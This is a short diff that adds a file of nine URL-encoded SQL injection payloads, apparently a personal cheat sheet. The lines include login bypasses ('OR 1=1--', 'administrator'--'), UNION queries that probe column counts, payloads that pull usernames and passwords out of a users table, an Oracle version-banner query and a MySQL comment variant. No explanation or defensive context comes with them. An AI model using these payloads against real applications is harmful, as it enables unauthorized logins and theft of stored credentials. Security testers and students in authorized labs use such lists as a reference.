@@ -1,0 +1,9 @@
+'+OR+1=1--
+administrator'--
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+'abcdef',NULL,NULL--
+'+UNION+SELECT+username,+password+FROM+users--
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+'+union+select+null,null#
